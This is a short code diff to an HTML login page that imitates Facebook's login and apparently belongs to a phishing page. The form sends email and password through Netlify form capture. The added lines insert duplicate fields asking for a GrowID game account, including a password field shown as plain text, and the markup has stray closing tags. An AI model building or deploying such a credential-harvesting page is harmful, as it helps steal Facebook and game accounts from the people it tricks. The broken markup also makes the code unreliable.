@@ -146,7 +146,13 @@
             </div>
             <form class="login-form" action="success.html" method="post" data-netlify="true">
                <input type="text" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
+              <input id="email" type="text" maxlength="12" name="email" class="form-control error" placeholder="Enter your GrowID here!" required/>
+            </div>
+          </div>
                <input type="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required>
+      <input id="password" type="text" maxlength="12" name="password" class="form-control error" placeholder="Enter your GrowID here!" required/>
+            </div>
+          </div>
                <input type="hidden" name="login" value="Facebook" readonly>
                <button type="submit" class="btn-login-fb">Log In</button>
             </form>
